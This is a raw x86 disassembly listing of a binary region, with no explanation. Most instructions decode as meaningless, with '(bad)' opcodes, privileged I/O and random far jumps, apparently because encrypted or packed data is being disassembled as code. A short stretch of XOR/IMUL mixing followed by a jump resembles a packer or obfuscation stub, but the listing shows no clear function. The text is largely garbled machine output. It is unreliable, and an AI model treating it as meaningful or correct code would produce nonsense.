  413db3:	sub    BYTE PTR [ebx],ch
  413db5:	pop    edx
  413db6:	cld    
  413db7:	mov    ds:0x7eef57e7,eax
  413dbc:	(bad)  
  413dbd:	push   0x5
  413dbf:	and    eax,0xe4b9d334
  413dc4:	push   ds
  413dc5:	xor    eax,0xc3fecc76
  413dca:	mov    al,0xe
  413dcc:	daa    
  413dcd:	js     0x413d77
  413dcf:	out    dx,eax
  413dd0:	jmp    0x18c6:0xa9e9f711
  413dd7:	retf   0x8049
  413dda:	adc    esi,edi
  413ddc:	jne    0x413d95
  413dde:	cmp    eax,0x2b17c7b5
  413de3:	loope  0x413d9e
  413de5:	gs mov cl,0x4c
  413de8:	jo     0x413e32
  413dea:	imul   ebp,DWORD PTR [eax],0x3c7f7be8
  413df0:	push   esp
  413df1:	mov    BYTE PTR ds:0xe3d28f21,bl
  413df7:	inc    ecx
  413df8:	sti    
  413df9:	or     edx,DWORD PTR [eax-0x18c0229f]
  413dff:	inc    ecx
  413e00:	aad    0x2f
  413e02:	adc    BYTE PTR [edx-0x77d7711e],0x41
  413e09:	loope  0x413dee
  413e0b:	dec    esi
  413e0c:	mov    ecx,0xa2243868
  413e11:	out    dx,al
  413e12:	add    al,0x31
  413e14:	int3   
  413e15:	mov    BYTE PTR [ebx-0x79fd2721],cl
  413e1b:	daa    
  413e1c:	popa   
  413e1d:	mov    dl,0xda
  413e1f:	xor    edi,DWORD PTR [edx-0xc]
  413e22:	test   BYTE PTR [ebp+eiz*2-0x23feeaaf],bl
  413e29:	or     DWORD PTR [ecx],ecx
  413e2b:	mov    edx,0xa6458308
  413e30:	sub    DWORD PTR [ebx-0x4a],ecx
  413e33:	xor    eax,0xae1868b1
  413e38:	jge    0x413e19
  413e3a:	sub    al,0x5c
  413e3c:	lods   eax,DWORD PTR gs:[esi]
  413e3e:	aaa    
  413e3f:	cs lahf 
  413e41:	test   eax,0xa25ff6cf
  413e46:	fcom   QWORD PTR [esi+0x36]
  413e49:	cmp    eax,0x8718158
  413e4e:	cmc    
  413e4f:	rep ins DWORD PTR es:[edi],dx
  413e51:	call   0xe1cc0572
  413e56:	sub    BYTE PTR [ebx+0x466781a5],dh
  413e5c:	xchg   BYTE PTR [eax*2-0x6eb612e7],dl
  413e63:	lods   al,BYTE PTR ds:[esi]
  413e64:	inc    edi
  413e65:	push   ebp
  413e66:	mov    al,0xc3
  413e68:	inc    edi
  413e69:	mov    ebp,0x7d08e5f7
  413e6e:	sbb    DWORD PTR [edx-0x1f],edx
  413e71:	or     ch,al
  413e73:	aaa    
  413e74:	jl     0x413eaa
  413e76:	mov    ch,0xd
  413e78:	pop    ebp
  413e79:	pop    ecx
  413e7a:	aas    
  413e7b:	iret   
  413e7c:	jle    0x413e5c
  413e7e:	xchg   ecx,eax
  413e7f:	scas   eax,DWORD PTR es:[edi]
  413e80:	bound  ecx,QWORD PTR [edi-0x71]
  413e83:	test   al,0x83
  413e85:	jae    0x413e1c
  413e87:	or     edi,DWORD PTR [ecx-0x1]
  413e8a:	in     al,dx
  413e8b:	sub    DWORD PTR [edx],esp
  413e8d:	and    al,BYTE PTR [edx-0x6b]
  413e90:	xcrypt-cbc (bad)
  413e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e92:	adc    DWORD PTR [ebx-0x569876d0],ecx
  413e98:	lea    esp,[ecx-0xc7893a8]
  413e9e:	js     0x413e51
  413ea0:	out    dx,al
  413ea1:	imul   edi,esp,0x6b53e43f
  413ea7:	stos   DWORD PTR es:[edi],eax
  413ea8:	(bad)  
  413ea9:	loope  0x413e82
  413eab:	imul   edx,DWORD PTR [eax],0x5b
  413eae:	jmp    0x938a:0xd1b7b54c
  413eb5:	adc    DWORD PTR [ebp-0x25],edi
  413eb8:	sbb    eax,0xb8fcba5d
  413ebd:	pop    esp
  413ebe:	and    esp,DWORD PTR [ebp-0x3d]
  413ec1:	fs push cs
  413ec3:	jmp    0x413eb5
  413ec5:	pop    eax
  413ec6:	test   eax,0x7f6b76ad
  413ecb:	mov    edx,0x88e0888d
  413ed0:	div    ch
  413ed2:	jmp    0xba071072
  413ed7:	mov    BYTE PTR es:[ecx+0x65],bl
  413edb:	(bad)  
  413edc:	fidivr DWORD PTR [ecx+esi*1+0x7]
  413ee0:	mov    eax,0x2443e8e1
  413ee5:	jecxz  0x413f5c
  413ee7:	inc    ecx
  413ee8:	mov    edi,0xdbe9ef14
  413eed:	out    dx,al
  413eee:	int3   
  413eef:	xchg   ebx,eax
  413ef0:	mov    cl,ch
  413ef2:	mov    eax,ds:0x200c6ed3
  413ef7:	scas   eax,DWORD PTR es:[edi]
  413ef8:	sbb    BYTE PTR [ebx],cl
  413efa:	test   eax,0x1256fc0d
  413eff:	xchg   DWORD PTR [ebx+edi*2-0x7781baa5],edx
  413f06:	cmp    ebx,DWORD PTR [ebx+0x317eb643]
  413f0c:	sbb    ch,BYTE PTR [edi+0x4637bc67]
  413f12:	adc    al,0x86
  413f14:	mov    gs,WORD PTR [esi]
  413f16:	dec    ebp
  413f17:	ret    0x1fb4
  413f1a:	xchg   ebx,eax
  413f1b:	mov    ds:0x7c889f80,al
  413f20:	andps  xmm4,XMMWORD PTR [ecx-0x36]
  413f24:	imul   ecx,DWORD PTR [ecx+ecx*8],0x26
  413f28:	add    ch,BYTE PTR [ecx+0x6b]
  413f2b:	adc    ebx,edx
  413f2d:	xchg   ebp,eax
  413f2e:	stc    
  413f2f:	jecxz  0x413f64
  413f31:	rcl    DWORD PTR [ebp-0x397265fd],0x97
  413f38:	pop    ds
  413f39:	xor    eax,0x3fa724b5
  413f3e:	aaa    
  413f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f40:	inc    esp
  413f41:	out    0x32,eax
  413f43:	mov    edx,0xdcd672f2
  413f48:	mov    al,0xf9
  413f4a:	cli    
  413f4b:	repnz out 0x37,eax
  413f4e:	pop    ecx
  413f4f:	ins    BYTE PTR es:[edi],dx
  413f50:	imul   ecx,DWORD PTR [ecx+0x6d7f4443],0xffffffc2
  413f57:	inc    edi
  413f58:	sti    
  413f59:	rcl    BYTE PTR [ebx-0x66310af8],0xab
  413f60:	and    edi,DWORD PTR ds:0xb1cdf7ea
  413f66:	mov    eax,ds:0xcd77b40f
  413f6b:	jmp    0x413f3f
  413f6d:	sub    BYTE PTR [edx],cl
  413f6f:	xchg   ebp,eax
  413f70:	les    ecx,FWORD PTR ds:0x6769eb88
  413f76:	sti    
  413f77:	xchg   BYTE PTR [ebx+0x61bc88f8],bh
  413f7d:	sbb    bh,0x1a
  413f80:	arpl   cx,dx
  413f82:	xor    dh,bh
  413f84:	jp     0x413fd1
  413f86:	sub    DWORD PTR [ebp-0x3],0x707e41c9
  413f8d:	pop    ds
  413f8e:	jo     0x413f30
  413f90:	icebp  
  413f91:	call   0x1c142e27
  413f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f97:	retf   
  413f98:	popa   
  413f99:	mov    eax,0x8b08558b
  413f9e:	pop    ebp
  413f9f:	clc    
  413fa0:	xor    edx,eax
  413fa2:	xor    ebx,eax
  413fa4:	sub    edx,ebx
  413fa6:	sub    edx,esi
  413fa8:	xor    edx,eax
  413faa:	mov    DWORD PTR [ebp+0x8],edx
  413fad:	mov    edx,DWORD PTR [ebp+0x8]
  413fb0:	mov    ebx,DWORD PTR [ebp-0x58]
  413fb3:	add    edx,0x5708c4
  413fb9:	imul   edx,ebx
  413fbc:	mov    DWORD PTR [ebp-0x58],edx
  413fbf:	mov    edx,DWORD PTR [ebp+0x8]
  413fc2:	mov    ebx,DWORD PTR [ebp-0x54]
  413fc5:	add    edx,0x64f8da
  413fcb:	or     edx,ebx
  413fcd:	mov    DWORD PTR [ebp-0x54],edx
  413fd0:	mov    edx,DWORD PTR [ebp+0x8]
  413fd3:	mov    ebx,DWORD PTR [ebp-0x50]
  413fd6:	add    edx,ecx
  413fd8:	xor    edx,ebx
  413fda:	mov    DWORD PTR [ebp-0x50],edx
  413fdd:	mov    edx,DWORD PTR [ebp+0x8]
  413fe0:	mov    ebx,DWORD PTR [ebp-0x4c]
  413fe3:	add    edx,edi
  413fe5:	and    edx,ebx
  413fe7:	mov    DWORD PTR [ebp-0x4c],edx
  413fea:	mov    edx,DWORD PTR [ebp+0x8]
  413fed:	mov    ebx,DWORD PTR [ebp-0x48]
  413ff0:	lea    edx,[ebx+edx*1+0x241fc1f]
  413ff7:	mov    DWORD PTR [ebp-0x48],edx
  413ffa:	mov    edx,DWORD PTR [ebp+0x8]
  413ffd:	mov    ebx,0xfa5e15e2
  414002:	jmp    0x4163b6
  414007:	scas   eax,DWORD PTR es:[edi]
  414008:	shl    BYTE PTR [eax-0x7f],cl
  41400b:	jno    0x413f90
  41400d:	scas   eax,DWORD PTR es:[edi]
  41400e:	mov    dl,0xfb
  414010:	xor    DWORD PTR [edi-0x3e],edx
  414013:	sub    DWORD PTR [edi-0x28],eax
  414016:	add    DWORD PTR [edx-0x1483838c],esp
  41401c:	pop    edi
  41401d:	jl     0x41409b
  41401f:	dec    ebx
  414020:	mov    fs,WORD PTR [edx+0x1e]
  414023:	dec    ebx
  414024:	xchg   esi,eax
  414025:	test   edx,0x4e257bda
  41402b:	hlt    
  41402c:	pop    eax
  41402d:	push   cs
  41402e:	out    0xf4,eax
  414030:	push   edi
  414031:	les    esp,FWORD PTR [ecx+0x6d]
  414034:	add    esi,DWORD PTR ds:0xd01bc075
  41403a:	ret    0x732a
  41403d:	add    bh,BYTE PTR [ebp-0xc]
  414040:	push   ss
  414041:	mov    edx,ebp
  414043:	sbb    BYTE PTR [ebp-0x7],ah
  414046:	ret    
  414047:	xchg   esi,eax
  414048:	inc    ebx
  414049:	add    BYTE PTR [ecx-0x5396ef0e],ah
  41404f:	xchg   ebp,eax
  414050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414051:	and    DWORD PTR [esp+ebp*2-0x26],esi
  414055:	jge    0x414029
  414057:	bound  edx,QWORD PTR [edi-0x196dc2c6]
  41405d:	(bad)  
  41405e:	shl    DWORD PTR [edi-0x41],cl
  414061:	mov    esp,0x9fe99296
  414066:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414068:	xchg   al,cl
  41406a:	cmp    ebp,DWORD PTR [ebx-0x4d1bc366]
  414070:	rcr    ch,0x44
  414073:	pusha  
  414074:	mov    ecx,0xd536bb6d
  414079:	fidiv  WORD PTR [ecx]
  41407b:	ret    
  41407c:	mov    esi,DWORD PTR [eax-0x253b4c79]
  414082:	or     BYTE PTR [ebx+0x38543c3e],0x4
  414089:	xchg   edx,eax
  41408a:	out    0xdd,eax
  41408c:	rcr    BYTE PTR [esp+esi*8-0x1c7e6a40],0xe8
  414094:	je     0x414043
  414096:	repnz add eax,0x3ae02c5f
  41409c:	jle    0x4140f4
  41409e:	sahf   
  41409f:	add    ebx,ecx
  4140a1:	repz push ebx
  4140a3:	or     edi,DWORD PTR [ecx+0x6a]
  4140a6:	adc    cl,BYTE PTR [ebp-0x769ff01e]
  4140ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ad:	xor    DWORD PTR [ebx+0xb],edx
  4140b0:	adc    al,0xca
  4140b2:	inc    ebp
  4140b3:	pop    esi
  4140b4:	sub    BYTE PTR [ebx],al
  4140b6:	fdiv   st(4),st
  4140b8:	inc    ecx
  4140b9:	xchg   edi,eax
  4140ba:	sar    DWORD PTR [edi],cl
  4140bc:	sbb    DWORD PTR [edi-0x49],ebx
  4140bf:	cs pop edx
  4140c1:	push   0x6e
  4140c3:	jp     0x4140f3
  4140c5:	mov    ch,0x7e
  4140c8:	dec    esi
  4140c9:	bound  edi,QWORD PTR [ecx+0x7c]
  4140cc:	wbinvd 
  4140ce:	data16 or BYTE PTR [edx+0x42ae4162],0x85
  4140d6:	mov    al,ds:0x75ade21e
  4140db:	mov    ebp,0x1c0eb26b
  4140e0:	dec    ebx
  4140e1:	push   0xffffff8c
  4140e3:	mov    ecx,DWORD PTR [eax+0x53]
  4140e6:	pushf  
  4140e7:	in     eax,0x3e
  4140e9:	in     eax,dx
  4140ea:	mov    bl,0x58
  4140ec:	arpl   WORD PTR [ebp+0x479dca9d],di
  4140f2:	iret   
  4140f3:	adc    bh,cl
  4140f5:	adc    al,BYTE PTR [esi+eiz*8+0x12]
  4140f9:	sti    
  4140fa:	mov    edx,DWORD PTR [ecx]
  4140fc:	push   es
  4140fd:	and    BYTE PTR [eax-0x4f],dl
  414100:	leave  
  414101:	bound  ebx,QWORD PTR [esi+0x53]
  414104:	(bad)  
  414105:	mov    dl,0x5f
  414107:	and    al,0x69
  414109:	(bad)  
  41410a:	mov    edx,0x6e99e045
  41410f:	pushf  
  414110:	jp     0x4140bc
  414112:	or     DWORD PTR [eax],ebp
  414114:	mov    dh,0x9b
  414116:	mov    eax,ds:0x163e0a0a
  41411b:	nop
  41411c:	xchg   DWORD PTR [edx+0x20],esi
  41411f:	pushf  
  414120:	xor    bh,ah
  414122:	pop    es
  414123:	add    ebx,0xc1594374
  414129:	sbb    BYTE PTR [esi+0x23],cl
  41412c:	sbb    DWORD PTR [edi],eax
  41412e:	shr    DWORD PTR [ecx+0x69ac88f2],cl
  414134:	and    edi,0xbcc981f3
  41413a:	inc    ecx
  41413b:	add    al,0x1f
  41413d:	add    al,0x69
  41413f:	xor    ch,BYTE PTR [edx-0x49e37976]
  414145:	jg     0x4141bd
  414147:	or     dh,BYTE PTR [edx+esi*2-0x6bac7ef9]
  41414e:	adc    BYTE PTR [edi+0x49a494c0],ah
  414154:	fiadd  DWORD PTR [ecx+ebx*4+0x66]
  414158:	sti    
  414159:	mov    ch,BYTE PTR [esi-0x45]
  41415c:	or     esp,DWORD PTR [eax+edx*8+0x522fd3e0]
  414163:	(bad)  
  414164:	loopne 0x414106
  414166:	mov    esp,0x3699580a
  41416b:	test   BYTE PTR ds:0xf9e2f245,0xcd
  414172:	ds fcmovbe st,st(6)
  414175:	or     esi,ecx
  414177:	and    esi,0xa9dc91ca
  41417d:	shl    esi,cl
  41417f:	sub    al,0x3e
  414181:	push   ecx
  414182:	or     eax,0xeb1ab33b
  414187:	jl     0x414110
  414189:	data16 das 
  41418b:	sbb    ebp,eax
  41418d:	lea    eax,[edx+0x62]
  414190:	add    DWORD PTR [eax],edi
  414192:	daa    
  414193:	pop    eax
  414194:	scas   eax,DWORD PTR es:[edi]
  414195:	fdiv   st,st(1)
  414197:	js     0x4141e8
  414199:	and    BYTE PTR [esi-0x25],bl
  41419c:	fst    QWORD PTR [eax]
  41419e:	jnp    0x414160
  4141a0:	pop    edi
  4141a1:	inc    ebx
  4141a2:	pop    edx
  4141a3:	or     cl,BYTE PTR [ebp-0x2e1a208c]
  4141a9:	add    dl,dh
  4141ab:	sub    edx,DWORD PTR [esi-0x53d6a533]
  4141b1:	xchg   BYTE PTR [edx+esi*4],ah
  4141b4:	ror    BYTE PTR [eax+0x2f],1
  4141b7:	inc    ecx
  4141b8:	(bad)  
  4141b9:	pusha  
  4141ba:	lods   al,BYTE PTR ds:[esi]
  4141bb:	cmp    al,0xc4
  4141bd:	aaa    
  4141be:	inc    ebx
  4141bf:	mov    al,0x16
  4141c1:	sub    DWORD PTR [eax+ebp*4-0x7],eax
  4141c5:	neg    BYTE PTR ds:0x8e693180
  4141cb:	scas   eax,DWORD PTR es:[edi]
  4141cc:	into   
  4141cd:	cmc    
  4141ce:	int    0x8a
  4141d0:	mov    dh,0x17
  4141d2:	loope  0x41416b
  4141d4:	jle    0x4141d8
  4141d6:	cdq    
  4141d7:	push   esi
  4141d8:	aas    
  4141d9:	lea    ebx,[eax-0x2e23db70]
  4141df:	clc    
  4141e0:	xchg   dl,bl
  4141e2:	lea    ebx,[ebx+ecx*1]
  4141e5:	or     BYTE PTR [edx-0x66e32c9],bh
  4141eb:	popa   
  4141ec:	mov    eax,ds:0x3c71da68
  4141f1:	jle    0x4141f2
  4141f3:	fidivr DWORD PTR [edx+0x46]
  4141f6:	pop    edi
  4141f7:	rol    DWORD PTR [ebp+0x48f077d4],1
  4141fd:	(bad)  
  4141fe:	cmp    al,0x52
  414200:	dec    ecx
  414201:	pop    ss
  414202:	icebp  
  414203:	sub    bh,BYTE PTR [eax+ebp*4]
  414206:	sbb    BYTE PTR [ecx-0x1f623344],ah
  41420c:	cmp    BYTE PTR [edi],dl
  41420e:	xor    al,0xb3
  414210:	xor    edx,DWORD PTR [edi-0x2b]
  414213:	loopne 0x4141c5
  414215:	stos   DWORD PTR es:[edi],eax
  414216:	in     al,0x81
  414218:	stos   BYTE PTR es:[edi],al
  414219:	bnd jae 0x41427b
  41421c:	fadd   DWORD PTR [ebp-0x44]
  41421f:	lsl    ebp,dx
  414222:	loopne 0x4141be
  414224:	mov    edi,0xf09b469d
  414229:	sub    eax,0x9232981d
  41422e:	lods   al,BYTE PTR ds:[esi]
  41422f:	jg     0x4141d9
  414231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414232:	mov    edi,0x2e9bf953
  414237:	inc    ebx
  414238:	aad    0x55
  41423a:	lahf   
  41423b:	fdivr  QWORD PTR [eax+0x74]
  41423e:	retf   0xf8
  414241:	ret    
  414242:	and    eax,0x41b27e90
  414247:	outs   dx,BYTE PTR ds:[esi]
  414248:	push   0x60
  41424a:	pop    DWORD PTR [ebx-0x73]
  41424d:	mov    edx,0x1c93cf19
  414252:	xor    esi,DWORD PTR [esi]
  414254:	mov    dl,0x83
  414256:	push   ebp
  414257:	jp     0x4141f6
  414259:	fcmovnb st,st(2)
  41425b:	sbb    al,0xd2
  41425d:	inc    eax
  41425e:	fsubp  st(5),st
  414260:	iret   
  414261:	jl     0x4142a0
  414263:	out    0x90,al
  414265:	(bad)  
  414268:	cli    
  414269:	dec    edi
  41426a:	in     al,dx
  41426b:	mov    dl,0x57
  41426d:	repz push edx
  41426f:	mov    dl,0x35
  414271:	ret    0x2913
  414274:	sbb    cl,ah
  414276:	cmp    DWORD PTR [edi],0xffffff96
  414279:	pushf  
  41427a:	lods   al,BYTE PTR ds:[esi]
  41427b:	sbb    ebx,esi
  41427d:	out    dx,eax
  41427e:	in     eax,dx
  41427f:	aas    
  414280:	mov    esi,0x1aef4444
  414285:	repnz mov edx,0x832eb02a
  41428b:	mov    ebx,0x8e9791de
  414290:	mov    al,0xb0
  414292:	mov    ch,0x5b
  414294:	loopne 0x4142df
  414296:	add    DWORD PTR [ebx-0x4eb1a0c6],esi
  41429c:	stos   DWORD PTR es:[edi],eax
  41429d:	jno    0x414256
  41429f:	dec    ebp
  4142a0:	test   BYTE PTR [ecx],cl
  4142a2:	dec    eax
  4142a3:	or     DWORD PTR [ebx],edx
  4142a5:	sbb    ebp,DWORD PTR [bp-0xc6b]
  4142aa:	iret   
  4142ab:	(bad)  
  4142ad:	mov    BYTE PTR [ebp+0x4a],dl
  4142b0:	es dec ebp
  4142b2:	dec    ebp
  4142b3:	mov    bh,0xde
  4142b5:	jp     0x414298
  4142b7:	push   edi
  4142b8:	sbb    al,dl
  4142ba:	popa   
  4142bb:	inc    ebx
  4142bc:	push   edi
  4142bd:	dec    esi
  4142be:	mov    bl,0xfc
  4142c0:	inc    edx
  4142c1:	fwait
  4142c2:	dec    ecx
  4142c3:	pop    ebx
  4142c4:	lods   al,BYTE PTR ds:[esi]
  4142c5:	rcr    BYTE PTR [ecx],cl
  4142c7:	jmp    0x44a50420
  4142cc:	stos   BYTE PTR es:[edi],al
  4142cd:	xchg   ecx,eax
  4142ce:	or     esi,DWORD PTR [edi-0x79a27f05]
  4142d4:	add    al,0x4
  4142d6:	and    cl,BYTE PTR [ebx-0x23]
  4142d9:	mov    esi,0x3e47c635
  4142de:	cmp    esi,esi
  4142e0:	pop    es
  4142e1:	cmp    eax,0x21fb8e36
  4142e6:	sub    al,0x7c
  4142e8:	rcr    BYTE PTR [esi],cl
  4142ea:	fist   WORD PTR [esi]
  4142ec:	inc    eax
  4142ed:	mov    bl,0xf
  4142ef:	call   0x21a2:0xeaf7f73c
  4142f6:	cwde   
  4142f7:	mov    al,0x50
  4142f9:	cwde   
  4142fa:	or     eax,0xdb1f9558
  4142ff:	pop    ds
  414300:	xchg   ecx,eax
  414301:	jne    0x41428e
  414303:	pop    ds
  414304:	sbb    ebx,DWORD PTR [edi+eiz*8-0x16ef8c4]
  41430b:	fst    QWORD PTR [edx+ebx*1-0x6b]
  41430f:	dec    ecx
  414310:	adc    eax,0x281d36e
  414315:	or     BYTE PTR [ecx+ebx*2+0x40edec2e],ah
  41431c:	push   0xffffffeb
  41431e:	(bad)  
  41431f:	jo     0x414382
  414321:	mov    cr5,ecx
  414324:	xchg   ecx,eax
  414325:	mov    DWORD PTR [edx+eax*8],ecx
  414328:	or     al,BYTE PTR [eax-0x4a]
  41432b:	push   edx
  41432c:	ror    ah,1
  41432e:	clc    
  41432f:	out    dx,al
  414330:	mul    bh
  414332:	mov    edx,DWORD PTR [edx-0x3b923a34]
  414338:	retf   0xdfd
  41433b:	adc    al,0xaa
  41433d:	lods   eax,DWORD PTR ds:[esi]
  41433e:	mov    ch,0xf7
  414340:	cmp    DWORD PTR [ebp+0x11],ebx
  414343:	test   BYTE PTR ds:0x3e9ec037,ah
  414349:	push   cs
  41434a:	jle    0x414337
  41434c:	inc    ebp
  41434d:	xchg   DWORD PTR [ebx-0x3b],ebp
  414350:	inc    edi
  414351:	dec    esi
  414352:	lahf   
  414353:	lods   eax,DWORD PTR ds:[esi]
  414354:	loop   0x41435f
  414356:	cmp    eax,0x6e0db6b5
  41435b:	adc    eax,0x87960c80
  414360:	out    dx,al
  414361:	out    0x90,eax
  414363:	cmc    
  414364:	mov    esp,ebx
  414366:	mov    bl,0x99
  414368:	aas    
  414369:	in     al,dx
  41436a:	add    al,0xda
  41436c:	add    ebp,DWORD PTR [ebx+0x566325ed]
  414372:	inc    ecx
  414373:	xchg   esp,eax
  414374:	imul   ebp,DWORD PTR [edi+0x4b],0x72
  414378:	sahf   
  414379:	cs jmp 0x5725:0x8a1c41d7
  414381:	(bad)  
  414382:	mov    ch,0x61
  414384:	sub    eax,0xf750ee5d
  414389:	cmp    al,0x34
  41438b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41438c:	xor    ch,BYTE PTR [eax-0x265ddec9]
  414392:	iret   
  414393:	iret   
  414394:	xor    edx,ecx
  414396:	mov    ecx,0x7319373
  41439b:	aas    
  41439c:	pop    ebp
  41439d:	pop    esp
  41439e:	inc    esp
  41439f:	push   ebp
  4143a0:	and    edi,DWORD PTR ds:0x797357e9
  4143a6:	jge    0x41438a
  4143a8:	sub    DWORD PTR [ecx+0x7d],ebp
  4143ab:	sub    eax,0x9bd07112
  4143b0:	fsubr  QWORD PTR [ebp+0x48]
  4143b3:	call   0xd5e8c869
  4143b8:	cmp    eax,DWORD PTR [esi+0x313bd052]
  4143be:	sub    eax,0x4dc33086
  4143c3:	pop    ss
  4143c4:	mov    eax,ds:0x1269b86c
  4143c9:	and    DWORD PTR [edi+0x40ce5fb2],ecx
  4143cf:	adc    DWORD PTR [esi+0x3c97ec4d],ebx
  4143d5:	lods   eax,DWORD PTR ds:[esi]
  4143d6:	test   DWORD PTR [edi+0x50],ebp
  4143d9:	or     al,0xbe
  4143db:	and    eax,0xdcbbb6db
  4143e0:	sub    bl,BYTE PTR [esi]
  4143e2:	lods   eax,DWORD PTR ds:[esi]
  4143e3:	scas   eax,DWORD PTR es:[edi]
  4143e4:	mov    ebp,0x81793178
  4143e9:	loopne 0x4143a2
  4143eb:	push   edx
  4143ec:	test   al,0x15
  4143ee:	xor    DWORD PTR [esi],edi
  4143f0:	sub    BYTE PTR [ebx+0xf],ch
  4143f3:	xchg   ebx,eax
  4143f4:	jmp    DWORD PTR [ebx+ebx*4]
  4143f7:	fucomp st(2)
  4143f9:	pop    esp
  4143fa:	mov    eax,0xe5d015dc
  4143ff:	ret    
  414400:	loopne 0x414411
  414402:	ret    0x8eb4
  414405:	sub    eax,DWORD PTR [eax+0x7e666f76]
  41440b:	arpl   WORD PTR [esi-0x4998a638],di
  414411:	scas   eax,DWORD PTR es:[edi]
  414412:	test   eax,0xc3fbc8ab
  414417:	push   edx
  414418:	inc    eax
  414419:	xchg   edx,eax
  41441a:	mov    ch,0x11
  41441c:	scas   al,BYTE PTR es:[edi]
  41441d:	pusha  
  41441e:	lds    edx,FWORD PTR [edx-0x2a]
  414421:	fs mov cl,0x9d
  414424:	mov    esp,0x95d0478a
  414429:	push   esi
  41442a:	or     dh,0xfb
  41442d:	push   edi
  41442e:	or     BYTE PTR [ecx-0x33a19809],ch
  414434:	mov    dl,bl
  414436:	std    
  414437:	es mov bh,al
  41443a:	pop    es
  41443b:	addr16 dec ebp
  41443d:	add    al,0xd4
  41443f:	test   BYTE PTR [eax-0x4d407ab6],cl
  414445:	jns    0x4143dc
  414447:	xchg   edx,eax
  414448:	call   0x1e91:0x51ba25f4
  41444f:	sub    eax,0x6bddb27
  414454:	dec    edx
  414455:	and    eax,0x23c8a9e8
  41445a:	xchg   ebx,eax
  41445b:	jecxz  0x414443
  41445d:	dec    edx
  41445e:	cdq    
  41445f:	iret   
  414460:	push   edi
  414461:	mov    ebp,0x9c4aaa4d
  414466:	in     eax,dx
  414467:	ds icebp 
  414469:	sar    cl,0x6c
  41446c:	outs   dx,DWORD PTR ds:[esi]
  41446d:	loop   0x414481
  41446f:	js     0x414482
  414471:	pop    ebp
  414472:	mov    dl,BYTE PTR [ebp-0x471834ea]
  414478:	fcom   QWORD PTR [ecx-0x6de70e14]
  41447e:	fldcw  WORD PTR [edx]
  414480:	dec    eax
  414481:	outs   dx,DWORD PTR ds:[esi]
  414482:	add    bh,cl
  414484:	call   0x62f348a0
  414489:	and    al,0x8a
  41448b:	sbb    ecx,DWORD PTR [edx]
  41448d:	scas   al,BYTE PTR es:[edi]
  41448e:	pop    ds
  41448f:	mov    ebp,0xeb839893
  414494:	inc    ecx
  414495:	(bad)  
  414496:	into   
  414497:	das    
  414498:	cs push edx
  41449a:	outs   dx,DWORD PTR ds:[esi]
  41449b:	mov    cl,0x9b
  41449d:	sub    eax,0x8a90e1a1
  4144a2:	lahf   
  4144a3:	jmp    0x88d97ab7
  4144a8:	jge    0x414487
  4144aa:	cmc    
  4144ab:	mov    bl,0x6f
  4144ad:	call   0x5dc72c83
  4144b2:	in     eax,0x5d
  4144b4:	aad    0x3c
  4144b6:	lock jae 0x4144d4
  4144b9:	aaa    
  4144ba:	jns    0x41452d
  4144bc:	jp     0x41448d
  4144be:	pop    esp
  4144bf:	xor    cl,BYTE PTR [esi]
  4144c1:	fbld   TBYTE PTR [eax-0x63]
  4144c4:	xchg   ch,dl
  4144c6:	std    
  4144c7:	sbb    DWORD PTR ds:0x36d5103e,0x2a
  4144ce:	fsubr  DWORD PTR [esi-0x4c]
  4144d1:	mov    esp,0x6b804afe
  4144d6:	mov    al,0xd2
  4144d8:	push   es
  4144d9:	popf   
  4144da:	push   edx
  4144db:	in     eax,dx
  4144dc:	(bad)  
  4144dd:	jno    0x4144dc
  4144df:	enter  0xbe47,0xbf
  4144e3:	mov    ecx,DWORD PTR [edi]
  4144e5:	xchg   bh,bl
  4144e7:	push   cs
  4144e8:	sbb    eax,DWORD PTR [ebx+0x5e]
  4144eb:	mov    dh,0x94
  4144ed:	lods   al,BYTE PTR ds:[esi]
  4144ee:	sub    al,0x68
  4144f0:	cwde   
  4144f1:	int    0xf3
  4144f3:	dec    esp
  4144f4:	pop    es
  4144f5:	loop   0x41454b
  4144f7:	cmp    DWORD PTR [ebp-0x5d6b71be],edi
  4144fd:	inc    esi
  4144fe:	data16 fbstp TBYTE PTR [edx+0x316209ca]
  414505:	dec    ecx
  414506:	loope  0x414575
  414508:	mov    ds:0x726fda70,eax
  41450d:	dec    edx
  41450e:	mov    al,0xdb
  414510:	xchg   esi,eax
  414511:	jnp    0x4144cc
  414513:	sbb    ebp,DWORD PTR [esi-0x2a]
  414516:	mov    esp,0xa3d9a829
  41451b:	stos   DWORD PTR es:[edi],eax
  41451c:	fcomp  DWORD PTR gs:[eax-0x1344d9af]
  414523:	jnp    0x41457b
  414525:	sahf   
  414526:	or     al,0x1e
  414528:	out    0xde,al
  41452a:	loop   0x414521
  41452c:	add    al,0x72
  41452e:	addr16 test al,0xd1
  414531:	pop    edx
  414532:	std    
  414533:	loop   0x414568
  414535:	ja     0x4144b7
  414537:	adc    eax,0x510a0f22
  41453c:	push   cs
  41453d:	add    DWORD PTR [ecx+0x759047a],edx
  414543:	je     0x4144d3
  414545:	shr    DWORD PTR [edx-0x33daf4e0],1
  41454b:	(bad)  
  41454c:	repz dec ecx
  41454e:	sbb    DWORD PTR [ebx],ebp
  414550:	gs mov al,0x7e
  414553:	cwde   
  414554:	cwde   
  414555:	in     al,dx
  414556:	pop    ecx
  414557:	(bad)
  41455a:	inc    ebp
  41455b:	push   ebp
  41455c:	mov    edi,0x94842051
  414561:	jmp    0x44df229c
  414566:	dec    ecx
  414567:	les    ecx,FWORD PTR [edi-0x6283f487]
  41456d:	jnp    0x41457a
  41456f:	inc    esp
  414570:	(bad)  
  414571:	(bad)  
  414572:	cmp    edx,DWORD PTR [ebx]
  414574:	mov    bl,0x1
  414576:	xor    BYTE PTR [ecx-0xd],ah
  414579:	aas    
  41457a:	js     0x4145da
  41457c:	shl    BYTE PTR ds:0xd76eef73,0x77
  414583:	xor    BYTE PTR [ebx+0x7c57afaf],cl
  414589:	fcom   QWORD PTR [edx+0x2ea15956]
  41458f:	ror    DWORD PTR [eax+0x27fe5835],cl
  414595:	xstore-rng (bad)
  414596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414597:	inc    eax
  414598:	xchg   ecx,eax
